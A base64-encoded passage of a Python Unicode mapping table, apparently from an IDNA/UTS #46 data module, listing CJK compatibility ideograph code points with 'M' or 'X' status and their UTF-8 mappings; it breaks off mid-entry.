XG4gICAgKDB4MkY4NzcsIFwnTVwnLCBcJ1x4ZTVceGIxXHhhMFwnKSxcbiAgICAoMHgyRjg3OCwgXCdNXCcsIFwnXHhlNVx4YjFceGFlXCcpLFxuICAgICgweDJGODc5LCBcJ01cJywgXCdceGU1XHhiM1x4ODBcJyksXG4gICAgKDB4MkY4N0EsIFwnTVwnLCBcJ1x4ZTVceGIyXHg4ZFwnKSxcbiAgICAoMHgyRjg3QiwgXCdNXCcsIFwnXHhmMFx4YTFceGI3XHhhNFwnKSxcbiAgICAoMHgyRjg3QywgXCdNXCcsIFwnXHhlNVx4YjVceDgzXCcpLFxuICAgICgweDJGODdELCBcJ01cJywgXCdceGYwXHhhMVx4YjdceGE2XCcpLFxuICAgICgweDJGODdFLCBcJ01cJywgXCdceGU1XHhiNVx4YWVcJyksXG4gICAgKDB4MkY4N0YsIFwnTVwnLCBcJ1x4ZTVceGI1XHhhYlwnKSxcbiAgICAoMHgyRjg4MCwgXCdNXCcsIFwnXHhlNVx4YjVceGJjXCcpLFxuICAgICgweDJGODgxLCBcJ01cJywgXCdceGU1XHhiN1x4YTFcJyksXG4gICAgKDB4MkY4ODIsIFwnTVwnLCBcJ1x4ZTVceGI3XHhhMlwnKSxcbiAgICAoMHgyRjg4MywgXCdNXCcsIFwnXHhlM1x4YTBceGFmXCcpLFxuICAgICgweDJGODg0LCBcJ01cJywgXCdceGU1XHhiN1x4YmRcJyksXG4gICAgKDB4MkY4ODUsIFwnTVwnLCBcJ1x4ZTVceGI4XHhhOFwnKSxcbiAgICAoMHgyRjg4NiwgXCdNXCcsIFwnXHhlNVx4YjhceGJkXCcpLFxuICAgICgweDJGODg3LCBcJ01cJywgXCdceGU1XHhiOVx4YTlcJyksXG4gICAgKDB4MkY4ODgsIFwnTVwnLCBcJ1x4ZTNceGExXHhhMlwnKSxcbiAgICAoMHgyRjg4OSwgXCdNXCcsIFwnXHhmMFx4YTJceDg2XHg4M1wnKSxcbiAgICAoMHgyRjg4QSwgXCdNXCcsIFwnXHhlM1x4YTFceGJjXCcpLFxuICAgICgweDJGODhCLCBcJ01cJywgXCdceGU1XHhiYVx4YjBcJyksXG4gICAgKDB4MkY4OEMsIFwnTVwnLCBcJ1x4ZTVceGJhXHhiM1wnKSxcbiAgICAoMHgyRjg4RCwgXCdNXCcsIFwnXHhlNVx4YmFceGI2XCcpLFxuICAgICgweDJGODhFLCBcJ01cJywgXCdceGU1XHhiYlx4OGFcJyksXG4gICAgKDB4MkY4OEYsIFwnTVwnLCBcJ1x4ZjBceGFhXHg4ZVx4OTJcJyksXG4gICAgKDB4MkY4OTAsIFwnTVwnLCBcJ1x4ZTVceGJiXHhiZVwnKSxcbiAgICAoMHgyRjg5MSwgXCdNXCcsIFwnXHhmMFx4YTJceDhjXHhiMVwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzc3KCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHgyRjg5MywgXCdNXCcsIFwnXHhlOFx4ODhceDgxXCcpLFxuICAgICgweDJGODk0LCBcJ01cJywgXCdceGU1XHhiY1x4YTJcJyksXG4gICAgKDB4MkY4OTYsIFwnTVwnLCBcJ1x4ZTNceGEzXHg4N1wnKSxcbiAgICAoMHgyRjg5NywgXCdNXCcsIFwnXHhmMFx4YTNceDhhXHhiOFwnKSxcbiAgICAoMHgyRjg5OCwgXCdNXCcsIFwnXHhmMFx4YTZceDg3XHg5YVwnKSxcbiAgICAoMHgyRjg5OSwgXCdNXCcsIFwnXHhlNVx4YmRceGEyXCcpLFxuICAgICgweDJGODlBLCBcJ01cJywgXCdceGU1XHhiZFx4YWJcJyksXG4gICAgKDB4MkY4OUIsIFwnTVwnLCBcJ1x4ZTNceGEzXHhhM1wnKSxcbiAgICAoMHgyRjg5QywgXCdNXCcsIFwnXHhlNVx4YmVceDlhXCcpLFxuICAgICgweDJGODlELCBcJ01cJywgXCdceGU1XHhiZlx4OGRcJyksXG4gICAgKDB4MkY4OUUsIFwnTVwnLCBcJ1x4ZTVceGJmXHg5N1wnKSxcbiAgICAoMHgyRjg5RiwgXCdNXCcsIFwnXHhlNVx4YmZceGI5XCcpLFxuICAgICgweDJGOEEwLCBcJ01cJywgXCdceGU2XHg4Mlx4ODFcJyksXG4gICAgKDB4MkY4QTEsIFwnTVwnLCBcJ1x4ZTNceGE0XHhiYVwnKSxcbiAgICAoMHgyRjhBMiwgXCdNXCcsIFwnXHhlM1x4YTRceDljXCcpLFxuICAgICgweDJGOEEzLCBcJ01cJywgXCdceGU2XHg4Mlx4OTRcJyksXG4gICAgKDB4MkY4QTQsIFwnTVwnLCBcJ1x4ZjBceGEyXHg5Ylx4OTRcJyksXG4gICAgKDB4MkY4QTUsIFwnTVwnLCBcJ1x4ZTZceDgzXHg4N1wnKSxcbiAgICAoMHgyRjhBNiwgXCdNXCcsIFwnXHhlNlx4ODVceDg4XCcpLFxuICAgICgweDJGOEE3LCBcJ01cJywgXCdceGU2XHg4NVx4OGNcJyksXG4gICAgKDB4MkY4QTgsIFwnTVwnLCBcJ1x4ZTZceDg1XHg4ZVwnKSxcbiAgICAoMHgyRjhBOSwgXCdNXCcsIFwnXHhlNlx4ODVceDhjXCcpLFxuICAgICgweDJGOEFBLCBcJ01cJywgXCdceGU2XHg4NVx4YmFcJyksXG4gICAgKDB4MkY4QUIsIFwnTVwnLCBcJ1x4ZTZceDg2XHg4ZVwnKSxcbiAgICAoMHgyRjhBQywgXCdNXCcsIFwnXHhlNlx4ODZceGIyXCcpLFxuICAgICgweDJGOEFELCBcJ01cJywgXCdceGU2XHg4Nlx4YTRcJyksXG4gICAgKDB4MkY4QUUsIFwnTVwnLCBcJ1x4ZTZceDg2XHhhZlwnKSxcbiAgICAoMHgyRjhBRiwgXCdNXCcsIFwnXHhlNlx4ODdceDllXCcpLFxuICAgICgweDJGOEIwLCBcJ01cJywgXCdceGU2XHg4N1x4YjJcJyksXG4gICAgKDB4MkY4QjEsIFwnTVwnLCBcJ1x4ZTZceDg3XHhiNlwnKSxcbiAgICAoMHgyRjhCMiwgXCdNXCcsIFwnXHhlNlx4ODhceDkwXCcpLFxuICAgICgweDJGOEIzLCBcJ01cJywgXCdceGU2XHg4OFx4OWJcJyksXG4gICAgKDB4MkY4QjQsIFwnTVwnLCBcJ1x4ZTZceDg5XHg5ZFwnKSxcbiAgICAoMHgyRjhCNSwgXCdNXCcsIFwnXHhlNlx4OGFceGIxXCcpLFxuICAgICgweDJGOEI2LCBcJ01cJywgXCdceGU2XHg4Ylx4OTRcJyksXG4gICAgKDB4MkY4QjcsIFwnTVwnLCBcJ1x4ZTZceDhkXHg5MFwnKSxcbiAgICAoMHgyRjhCOCwgXCdNXCcsIFwnXHhmMFx4YTJceGFjXHg4Y1wnKSxcbiAgICAoMHgyRjhCOSwgXCdNXCcsIFwnXHhlNlx4OGNceGJkXCcpLFxuICAgICgweDJGOEJBLCBcJ01cJywgXCdceGU2XHg4Ylx4YmNcJyksXG4gICAgKDB4MkY4QkIsIFwnTVwnLCBcJ1x4ZTZceDhkXHhhOFwnKSxcbiAgICAoMHgyRjhCQywgXCdNXCcsIFwnXHhlNlx4OGVceDgzXCcpLFxuICAgICgweDJGOEJELCBcJ01cJywgXCdceGU2XHg4Zlx4YTRcJyksXG4gICAgKDB4MkY4QkUsIFwnTVwnLCBcJ1x4ZjBceGEyXHhhZlx4YjFcJyksXG4gICAgKDB4MkY4QkYsIFwnTVwnLCBcJ1x4ZTZceDkwXHhhMlwnKSxcbiAgICAoMHgyRjhDMCwgXCdNXCcsIFwnXHhlNlx4OGZceDg1XCcpLFxuICAgICgweDJGOEMxLCBcJ01cJywgXCdceGU2XHg4ZVx4YTlcJyksXG4gICAgKDB4MkY4QzIsIFwnTVwnLCBcJ1x4ZTNceGE4XHhhZVwnKSxcbiAgICAoMHgyRjhDMywgXCdNXCcsIFwnXHhlNlx4OTFceGE5XCcpLFxuICAgICgweDJGOEM0LCBcJ01cJywgXCdceGU2XHg5MVx4YmVcJyksXG4gICAgKDB4MkY4QzUsIFwnTVwnLCBcJ1x4ZTZceDkyXHg5ZFwnKSxcbiAgICAoMHgyRjhDNiwgXCdNXCcsIFwnXHhlNlx4OTFceGI3XCcpLFxuICAgICgweDJGOEM3LCBcJ01cJywgXCdceGUzXHhhOVx4YWNcJyksXG4gICAgKDB4MkY4QzgsIFwnTVwnLCBcJ1x4ZTZceDk1XHg4ZlwnKSxcbiAgICAoMHgyRjhDOSwgXCdNXCcsIFwnXHhlNlx4OTVceGFjXCcpLFxuICAgICgweDJGOENBLCBcJ01cJywgXCdceGYwXHhhM1x4ODBceDhhXCcpLFxuICAgICgweDJGOENCLCBcJ01cJywgXCdceGU2XHg5N1x4YTNcJyksXG4gICAgKDB4MkY4Q0MsIFwnTVwnLCBcJ1x4ZTZceDliXHhiOFwnKSxcbiAgICAoMHgyRjhDRCwgXCdNXCcsIFwnXHhlNlx4OTlceDg5XCcpLFxuICAgICgweDJGOENFLCBcJ01cJywgXCdceGUzXHhhY1x4OTlcJyksXG4gICAgKDB4MkY4Q0YsIFwnTVwnLCBcJ1x4ZTZceDlhXHg5MVwnKSxcbiAgICAoMHgyRjhEMCwgXCdNXCcsIFwnXHhlM1x4YWNceDg4XCcpLFxuICAgICgweDJGOEQxLCBcJ01cJywgXCdceGUzXHhhYlx4YTRcJyksXG4gICAgKDB4MkY4RDIsIFwnTVwnLCBcJ1x4ZTVceDg2XHg5MlwnKSxcbiAgICAoMHgyRjhEMywgXCdNXCcsIFwnXHhlNVx4ODZceDk1XCcpLFxuICAgICgweDJGOEQ0LCBcJ01cJywgXCdceGU2XHg5Y1x4ODBcJyksXG4gICAgKDB4MkY4RDUsIFwnTVwnLCBcJ1x4ZTZceDlhXHg5Y1wnKSxcbiAgICAoMHgyRjhENiwgXCdNXCcsIFwnXHhlOFx4ODJceGFkXCcpLFxuICAgICgweDJGOEQ3LCBcJ01cJywgXCdceGU0XHg4Zlx4OTlcJyksXG4gICAgKDB4MkY4RDgsIFwnTVwnLCBcJ1x4ZTZceDljXHg5N1wnKSxcbiAgICAoMHgyRjhEOSwgXCdNXCcsIFwnXHhlNlx4OWNceDliXCcpLFxuICAgICgweDJGOERBLCBcJ01cJywgXCdceGU2XHg5Y1x4YTFcJyksXG4gICAgKDB4MkY4REIsIFwnTVwnLCBcJ1x4ZTZceDlkXHg5ZVwnKSxcbiAgICAoMHgyRjhEQywgXCdNXCcsIFwnXHhlNlx4OWRceDkzXCcpLFxuICAgICgweDJGOERELCBcJ01cJywgXCdceGYwXHhhM1x4OGZceDgzXCcpLFxuICAgICgweDJGOERFLCBcJ01cJywgXCdceGUzXHhhZFx4ODlcJyksXG4gICAgKDB4MkY4REYsIFwnTVwnLCBcJ1x4ZTZceDlmXHhiYVwnKSxcbiAgICAoMHgyRjhFMCwgXCdNXCcsIFwnXHhlNlx4OWVceDg1XCcpLFxuICAgICgweDJGOEUxLCBcJ01cJywgXCdceGU2XHhhMVx4OTJcJyksXG4gICAgKDB4MkY4RTIsIFwnTVwnLCBcJ1x4ZTZceGEyXHg4NVwnKSxcbiAgICAoMHgyRjhFMywgXCdNXCcsIFwnXHhmMFx4YTNceDkxXHhhZFwnKSxcbiAgICAoMHgyRjhFNCwgXCdNXCcsIFwnXHhlNlx4YTJceDhlXCcpLFxuICAgICgweDJGOEU1LCBcJ01cJywgXCdceGU2XHhhMFx4OWZcJyksXG4gICAgKDB4MkY4RTYsIFwnTVwnLCBcJ1x4ZTZceGE0XHg5NFwnKSxcbiAgICAoMHgyRjhFNywgXCdNXCcsIFwnXHhlM1x4YWVceDlkXCcpLFxuICAgICgweDJGOEU4LCBcJ01cJywgXCdceGU2XHhhNVx4ODJcJyksXG4gICAgKDB4MkY4RTksIFwnTVwnLCBcJ1x4ZTZceGE2XHhhM1wnKSxcbiAgICAoMHgyRjhFQSwgXCdNXCcsIFwnXHhlNlx4YTdceGFhXCcpLFxuICAgICgweDJGOEVCLCBcJ01cJywgXCdceGU2XHhhYVx4YThcJyksXG4gICAgKDB4MkY4RUMsIFwnTVwnLCBcJ1x4ZjBceGEzXHg5YVx4YTNcJyksXG4gICAgKDB4MkY4RUQsIFwnTVwnLCBcJ1x4ZTZceGFiXHg5YlwnKSxcbiAgICAoMHgyRjhFRSwgXCdNXCcsIFwnXHhlM1x4YjBceDk4XCcpLFxuICAgICgweDJGOEVGLCBcJ01cJywgXCdceGU2XHhhY1x4YTFcJyksXG4gICAgKDB4MkY4RjAsIFwnTVwnLCBcJ1x4ZjBceGEzXHhhMlx4YTdcJyksXG4gICAgKDB4MkY4RjEsIFwnTVwnLCBcJ1x4ZTZceGFkXHg5NFwnKSxcbiAgICAoMHgyRjhGMiwgXCdNXCcsIFwnXHhlM1x4YjFceDhlXCcpLFxuICAgICgweDJGOEYzLCBcJ01cJywgXCdceGU2XHhhZFx4YjJcJyksXG4gICAgKDB4MkY4RjQsIFwnTVwnLCBcJ1x4ZTZceGFlXHg5ZlwnKSxcbiAgICAoMHgyRjhGNSwgXCdNXCcsIFwnXHhlNlx4YWVceGJhXCcpLFxuICAgICgweDJGOEY2LCBcJ01cJywgXCdceGU2XHhhZVx4YmJcJyksXG4gICAgKDB4MkY4RjcsIFwnTVwnLCBcJ1x4ZjBceGEzXHhhYVx4OGRcJyksXG4gICAgXVxuXG5kZWYgX3NlZ183OCgpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4MkY4RjgsIFwnTVwnLCBcJ1x4ZjBceGExXHhiNFx4OGJcJyksXG4gICAgKDB4MkY4RjksIFwnTVwnLCBcJ1x4ZjBceGEzXHhhYlx4YmFcJyksXG4gICAgKDB4MkY4RkEsIFwnTVwnLCBcJ1x4ZTZceGIxXHg4ZVwnKSxcbiAgICAoMHgyRjhGQiwgXCdNXCcsIFwnXHhmMFx4YTNceGIyXHhiY1wnKSxcbiAgICAoMHgyRjhGQywgXCdNXCcsIFwnXHhlNlx4YjJceGJmXCcpLFxuICAgICgweDJGOEZELCBcJ01cJywgXCdceGU2XHhiM1x4OGRcJyksXG4gICAgKDB4MkY4RkUsIFwnTVwnLCBcJ1x4ZTZceGIxXHhhN1wnKSxcbiAgICAoMHgyRjhGRiwgXCdNXCcsIFwnXHhlNlx4YjRceDk2XCcpLFxuICAgICgweDJGOTAwLCBcJ01cJywgXCdceGU2XHhiNFx4YmVcJyksXG4gICAgKDB4MkY5MDEsIFwnTVwnLCBcJ1x4ZTZceGI1XHhiN1wnKSxcbiAgICAoMHgyRjkwMiwgXCdNXCcsIFwnXHhlNlx4YjVceDgxXCcpLFxuICAgICgweDJGOTAzLCBcJ01cJywgXCdceGU2XHhiNVx4YTlcJyksXG4gICAgKDB4MkY5MDQsIFwnTVwnLCBcJ1x4ZTZceGI1XHhiOFwnKSxcbiAgICAoMHgyRjkwNSwgXCdNXCcsIFwnXHhlNlx4YjZceDg1XCcpLFxuICAgICgweDJGOTA2LCBcJ01cJywgXCdceGYwXHhhM1x4YjRceDllXCcpLFxuICAgICgweDJGOTA3LCBcJ01cJywgXCdceGU2XHhiNFx4YjRcJyksXG4gICAgKDB4MkY5MDgsIFwnTVwnLCBcJ1x4ZTZceGI4XHhhZlwnKSxcbiAgICAoMHgyRjkwOSwgXCdNXCcsIFwnXHhlNlx4YjlceGFlXCcpLFxuICAgICgweDJGOTBBLCBcJ01cJywgXCdceGUzXHhiNFx4YjNcJyksXG4gICAgKDB4MkY5MEIsIFwnTVwnLCBcJ1x4ZTZceGJiXHg4YlwnKSxcbiAgICAoMHgyRjkwQywgXCdNXCcsIFwnXHhlNlx4YmJceDg3XCcpLFxuICAgICgweDJGOTBELCBcJ01cJywgXCdceGYwXHhhM1x4YmJceDkxXCcpLFxuICAgICgweDJGOTBFLCBcJ01cJywgXCdceGU2XHhiN1x4YjlcJyksXG4gICAgKDB4MkY5MEYsIFwnTVwnLCBcJ1x4ZTZceGJkXHhhZVwnKSxcbiAgICAoMHgyRjkxMCwgXCdNXCcsIFwnXHhmMFx4YTNceGJkXHg5ZVwnKSxcbiAgICAoMHgyRjkxMSwgXCdNXCcsIFwnXHhmMFx4YTNceGJlXHg4ZVwnKSxcbiAgICAoMHgyRjkxMiwgXCdNXCcsIFwnXHhlNlx4YmZceDg2XCcpLFxuICAgICgweDJGOTEzLCBcJ01cJywgXCdceGU3XHg4MFx4YjlcJyksXG4gICAgKDB4MkY5MTQsIFwnTVwnLCBcJ1x4ZTdceDgwXHg5ZVwnKSxcbiAgICAoMHgyRjkxNSwgXCdNXCcsIFwnXHhlN1x4ODBceDliXCcpLFxuICAgICgweDJGOTE2LCBcJ01cJywgXCdceGUzXHhiNlx4OTZcJyksXG4gICAgKDB4MkY5MTcsIFwnTVwnLCBcJ1x4ZTdceDgxXHg4YVwnKSxcbiAgICAoMHgyRjkxOCwgXCdNXCcsIFwnXHhlN1x4ODFceGJkXCcpLFxuICAgICgweDJGOTE5LCBcJ01cJywgXCdceGU3XHg4MVx4YjdcJyksXG4gICAgKDB4MkY5MUEsIFwnTVwnLCBcJ1x4ZTdceDgyXHhhZFwnKSxcbiAgICAoMHgyRjkxQiwgXCdNXCcsIFwnXHhmMFx4YTBceDk0XHhhNVwnKSxcbiAgICAoMHgyRjkxQywgXCdNXCcsIFwnXHhlN1x4ODVceDg1XCcpLFxuICAgICgweDJGOTFELCBcJ01cJywgXCdceGYwXHhhNFx4ODlceGEzXCcpLFxuICAgICgweDJGOTFFLCBcJ01cJywgXCdceGU3XHg4Nlx4OWNcJyksXG4gICAgKDB4MkY5MUYsIFwnWFwnKSxcbiAgICAoMHgyRjkyMCwgXCdNXCcsIFwnXHhlN1x4ODhceGE4XCcpLFxuICAgICgweDJGOTIxLCBcJ01cJywgXCdceGU3XHg4OFx4YjVcJyksXG4gICAgKDB4MkY5MjIsIFwnTVwnLCBcJ1x4ZTdceDg5XHg5MFwnKSxcbiAgICAoMHgyRjkyMywgXCdNXCcsIFwnXHhmMFx4YTRceDk4XHg4OFwnKSxcbiAgICAoMHgyRjkyNCwgXCdNXCcsIFwnXHhlN1x4OGFceDgwXCcpLFxuICAgICgweDJGOTI1LCBcJ01cJywgXCdceGU3XHg4YVx4OTVcJyksXG4gICAgKDB4MkY5MjYsIFwnTVwnLCBcJ1x4ZjBceGE0XHg5Y1x4YjVcJyksXG4gICAgKDB4MkY5MjcsIFwnTVwnLCBcJ1x4ZjBceGE0XHhhMFx4OTRcJyksXG4gICAgKDB4MkY5MjgsIFwnTVwnLCBcJ1x4ZTdceDhkXHhiYVwnKSxcbiAgICAoMHgyRjkyOSwgXCdNXCcsIFwnXHhlN1x4OGVceDhiXCcpLFxuICAgICgweDJGOTJBLCBcJ01cJywgXCdceGUzXHhiYVx4YWNcJyksXG4gICAgKDB4MkY5MkIsIFwnTVwnLCBcJ1x4ZTdceDhlXHhhNVwnKSxcbiAgICAoMHgyRjkyQywgXCdNXCcsIFwnXHhlM1x4YmFceGI4XCcpLFxuICAgICgweDJGOTJFLCBcJ01cJywgXCdceGU3XHg5MVx4ODdcJyksXG4gICAgKDB4MkY5MkYsIFwnTVwnLCBcJ1x4ZTdceDkxXHg5Y1wnKSxcbiAgICAoMHgyRjkzMCwgXCdNXCcsIFwnXHhlN1x4OTFceGIxXCcpLFxuICAgICgweDJGOTMxLCBcJ01cJywgXCdceGU3XHg5Mlx4ODVcJyksXG4gICAgKDB4MkY5MzIsIFwnTVwnLCBcJ1x4ZTdceDkzXHg4YVwnKSxcbiAgICAoMHgyRjkzMywgXCdNXCcsIFwnXHhlM1x4YmNceDliXCcpLFxuICAgICgweDJGOTM0LCBcJ01cJywgXCdceGU3XHg5NFx4YTRcJyksXG4gICAgKDB4MkY5MzUsIFwnTVwnLCBcJ1x4ZjBceGE0XHhiMFx4YjZcJyksXG4gICAgKDB4MkY5MzYsIFwnTVwnLCBcJ1x4ZTdceDk0XHhiZVwnKSxcbiAgICAoMHgyRjkzNywgXCdNXCcsIFwnXHhmMFx4YTRceGIyXHg5MlwnKSxcbiAgICAoMHgyRjkzOCwgXCdNXCcsIFwnXHhlN1x4OTVceGIwXCcpLFxuICAgICgweDJGOTM5LCBcJ01cJywgXCdceGYwXHhhMlx4ODZceDlmXCcpLFxuICAgICgweDJGOTNBLCBcJ01cJywgXCdceGU3XHg5OFx4OTBcJyksXG4gICAgKDB4MkY5M0IsIFwnTVwnLCBcJ1x4ZjBceGE0XHhiZVx4YTFcJyksXG4gICAgKDB4MkY5M0MsIFwnTVwnLCBcJ1x4ZjBceGE0XHhiZVx4YjhcJyksXG4gICAgKDB4MkY5M0QsIFwnTVwnLCBcJ1x4ZjBceGE1XHg4MVx4ODRcJyksXG4gICAgKDB4MkY5M0UsIFwnTVwnLCBcJ1x4ZTNceGJmXHhiY1wnKSxcbiAgICAoMHgyRjkzRiwgXCdNXCcsIFwnXHhlNFx4ODBceDg4XCcpLFxuICAgICgweDJGOTQwLCBcJ01cJywgXCdceGU3XHg5Ylx4YjRcJyksXG4gICAgKDB4MkY5NDEsIFwnTVwnLCBcJ1x4ZjBceGE1XHg4M1x4YjNcJyksXG4gICAgKDB4MkY5NDIsIFwnTVwnLCBcJ1x4ZjBceGE1XHg4M1x4YjJcJyksXG4gICAgKDB4MkY5NDMsIFwnTVwnLCBcJ1x4ZjBceGE1XHg4NFx4OTlcJyksXG4gICAgKDB4MkY5NDQsIFwnTVwnLCBcJ1x4ZjBceGE1XHg4NFx4YjNcJyksXG4gICAgKDB4MkY5NDUsIFwnTVwnLCBcJ1x4ZTdceDljXHg5ZVwnKSxcbiAgICAoMHgyRjk0NiwgXCdNXCcsIFwnXHhlN1x4OWNceDlmXCcpLFxuICAgICgweDJGOTQ4LCBcJ01cJywgXCdceGU3XHg5ZFx4OGFcJyksXG4gICAgKDB4MkY5NDksIFwnTVwnLCBcJ1x4ZTRceDgwXHhiOVwnKSxcbiAgICAoMHgyRjk0QSwgXCdNXCcsIFwnXHhlN1x4OWVceDhiXCcpLFxuICAgICgweDJGOTRCLCBcJ01cJywgXCdceGU0XHg4MVx4ODZcJyksXG4gICAgKDB4MkY5NEMsIFwnTVwnLCBcJ1x4ZTRceDgyXHg5NlwnKSxcbiAgICAoMHgyRjk0RCwgXCdNXCcsIFwnXHhmMFx4YTVceDkwXHg5ZFwnKSxcbiAgICAoMHgyRjk0RSwgXCdNXCcsIFwnXHhlN1x4YTFceDhlXCcpLFxuICAgICgweDJGOTRGLCBcJ01cJywgXCdceGU3XHhhMlx4OGNcJyksXG4gICAgKDB4MkY5NTAsIFwnTVwnLCBcJ1x4ZTdceGEzXHg4Y1wnKSxcbiAgICAoMHgyRjk1MSwgXCdNXCcsIFwnXHhlNFx4ODNceGEzXCcpLFxuICAgICgweDJGOTUyLCBcJ01cJywgXCdceGYwXHhhNVx4OThceGE2XCcpLFxuICAgICgweDJGOTUzLCBcJ01cJywgXCdceGU3XHhhNVx4OTZcJyksXG4gICAgKDB4MkY5NTQsIFwnTVwnLCBcJ1x4ZjBceGE1XHg5YVx4OWFcJyksXG4gICAgKDB4MkY5NTUsIFwnTVwnLCBcJ1x4ZjBceGE1XHg5Ylx4ODVcJyksXG4gICAgKDB4MkY5NTYsIFwnTVwnLCBcJ1x4ZTdceGE2XHg4ZlwnKSxcbiAgICAoMHgyRjk1NywgXCdNXCcsIFwnXHhlN1x4YTdceGFiXCcpLFxuICAgICgweDJGOTU4LCBcJ01cJywgXCdceGU0XHg4NFx4YWZcJyksXG4gICAgKDB4MkY5NTksIFwnTVwnLCBcJ1x4ZTdceGE5XHg4MFwnKSxcbiAgICAoMHgyRjk1QSwgXCdNXCcsIFwnXHhlN1x4YTlceDhhXCcpLFxuICAgICgweDJGOTVCLCBcJ01cJywgXCdceGU3XHhhOVx4OGZcJyksXG4gICAgKDB4MkY5NUMsIFwnTVwnLCBcJ1x4ZjBceGE1XHhhNVx4YmNcJyksXG4gICAgKDB4MkY5NUQsIFwnTVwnLCBcJ1x4ZjBceGE1XHhhYVx4YTdcJyksXG4gICAgXVxuXG5kZWYgX3NlZ183OSgpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4MkY5NUYsIFwnWFwnKSxcbiAgICAoMHgyRjk2MCwgXCdNXCcsIFwnXHhlNFx4ODhceDgyXCcpLFxuICAgICgweDJGOTYxLCBcJ01cJywgXCdceGYwXHhhNVx4YWVceGFiXCcpLFxuICAgICgweDJGOTYyLCBcJ01cJywgXCdceGU3XHhhZlx4ODZcJyksXG4gICAgKDB4MkY5NjMsIFwnTVwnLCBcJ1x4ZTdceGFmXHg4OVwnKSxcbiAgICAoMHgyRjk2NCwgXCdNXCcsIFwnXHhlNFx4ODhceGE3XCcpLFxuICAgICgweDJGOTY1LCBcJ01cJywgXCdceGYwXHhhNVx4YjJceDgwXCcpLFxuICAgICgweDJGOTY2LCBcJ01cJywgXCdceGU3XHhiM1x4OTJcJyksXG4gICAgKDB4MkY5NjcsIFwnTVwnLCBcJ1x4ZTRceDhhXHhhMFwnKSxcbiAgICAoMHgyRjk2OCwgXCdNXCcsIFwnXHhlN1x4YjNceGE4XCcpLFxuICAgICgweDJGOTY5LCBcJ01cJywgXCdceGU3XHhiM1x4YTNcJyksXG4gICAgKDB4MkY5NkEsIFwnTVwnLCBcJ1x4ZTdceGI0XHg4MFwnKSxcbiAgICAoMHgyRjk2QiwgXCdNXCcsIFwnXHhmMFx4YTVceGJlXHg4NlwnKSxcbiAgICAoMHgyRjk2QywgXCdNXCcsIFwnXHhlN1x4YjVceGEzXCcpLFxuICAgICgweDJGOTZELCBcJ01cJywgXCdceGU0XHg4Y1x4ODFcJyksXG4gICAgKDB4MkY5NkUsIFwnTVwnLCBcJ1x4ZTdceGI3XHg4N1wnKSxcbiAgICAoMHgyRjk2RiwgXCdNXCcsIFwnXHhlN1x4YjhceDgyXCcpLFxuICAgICgweDJGOTcwLCBcJ01cJywgXCdceGU3XHhiOVx4ODVcJyksXG4gICAgKDB4MkY5NzEsIFwnTVwnLCBcJ1x4ZTRceDhjXHhiNFwnKSxcbiAgICAoMHgyRjk3MiwgXCdNXCcsIFwnXHhmMFx4YTZceDg4XHhhOFwnKSxcbiAgICAoMHgyRjk3MywgXCdNXCcsIFwnXHhmMFx4YTZceDg5XHg4N1wnKSxcbiAgICAoMHgyRjk3NCwgXCdNXCcsIFwnXHhlNFx4OGRceDk5XCcpLFxuICAgICgweDJGOTc1LCBcJ01cJywgXCdceGYwXHhhNlx4OGJceDk5XCcpLFxuICAgICgweDJGOTc2LCBcJ01cJywgXCdceGU3XHhiZFx4YmFcJyksXG4gICAgKDB4MkY5NzcsIFwnTVwnLCBcJ1x4ZjBceGE2XHg4Y1x4YmVcJyksXG4gICAgKDB4MkY5NzgsIFwnTVwnLCBcJ1x4ZTdceGJlXHg5NVwnKSxcbiAgICAoMHgyRjk3OSwgXCdNXCcsIFwnXHhlN1x4YmZceGJhXCcpLFxuICAgICgweDJGOTdBLCBcJ01cJywgXCdceGU4XHg4MFx4ODVcJyksXG4gICAgKDB4MkY5N0IsIFwnTVwnLCBcJ1x4ZjBceGE2XHg5M1x4OWFcJyksXG4gICAgKDB4MkY5N0MsIFwnTVwnLCBcJ1x4ZjBceGE2XHg5NFx4YTNcJyksXG4gICAgKDB4MkY5N0QsIFwnTVwnLCBcJ1x4ZThceDgxXHhhMFwnKSxcbiAgICAoMHgyRjk3RSwgXCdNXCcsIFwnXHhmMFx4YTZceDk2XHhhOFwnKSxcbiAgICAoMHgyRjk3RiwgXCdNXCcsIFwnXHhlOFx4ODFceGIwXCcpLFxuICAgICgweDJGOTgwLCBcJ01cJywgXCdceGYwXHhhM1x4OGRceDlmXCcpLFxuICAgICgweDJGOTgxLCBcJ01cJywgXCdceGU0XHg4Zlx4OTVcJyksXG4gICAgKDB4MkY5ODIsIFwnTVwnLCBcJ1x4ZThceDgyXHhiMlwnKSxcbiAgICAoMHgyRjk4MywgXCdNXCcsIFwnXHhlOFx4ODRceDgzXCcpLFxuICAgICgweDJGOTg0LCBcJ01cJywgXCdceGU0XHg5MFx4OGJcJyksXG4gICAgKDB4MkY5ODUsIFwnTVwnLCBcJ1x4ZThceDg0XHhiZVwnKSxcbiAgICAoMHgyRjk4NiwgXCdNXCcsIFwnXHhlNVx4YWFceGI1XCcpLFxuICAgICgweDJGOTg3LCBcJ01cJywgXCdceGYwXHhhNlx4OWVceGE3XCcpLFxuICAgICgweDJGOTg4LCBcJ01cJywgXCdceGYwXHhhNlx4OWVceGI1XCcpLFxuICAgICgweDJGOTg5LCBcJ01cJywgXCdceGYwXHhhM1x4OGVceDkzXCcpLFxuICAgICgweDJGOThBLCBcJ01cJywgXCdceGYwXHhhM1x4OGVceDljXCcpLFxuICAgICgweDJGOThCLCBcJ01cJywgXCdceGU4XHg4OFx4ODFcJyksXG4gICAgKDB4MkY5OEMsIFwnTVwnLCBcJ1x4ZThceDg4XHg4NFwnKSxcbiAgICAoMHgyRjk4RCwgXCdNXCcsIFwnXHhlOFx4YmVceDllXCcpLFxuICAgICgweDJGOThFLCBcJ01cJywgXCdceGU0XHg5MVx4YWJcJyksXG4gICAgKDB4MkY5OEYsIFwnTVwnLCBcJ1x4ZThceDhhXHg5MVwnKSxcbiAgICAoMHgyRjk5MCwgXCdNXCcsIFwnXHhlOFx4OGFceDhiXCcpLFxuICAgICgweD